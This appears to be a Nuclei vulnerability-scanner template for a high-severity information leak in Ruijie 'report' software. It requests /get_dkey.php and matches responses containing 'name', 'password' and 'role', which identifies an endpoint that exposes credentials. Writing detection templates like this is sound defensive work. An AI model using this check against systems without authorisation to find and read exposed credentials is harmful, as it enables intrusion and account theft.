id: ruijie-report-leakage

info:
  name: 锐捷report信息泄露
  author: Str1am
  severity: high
  tags: 锐捷

requests:
  - method: GET
    path:
      - "{{BaseURL}}/get_dkey.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "name"
          - "password"
          - "role"
        part: body
        condition: and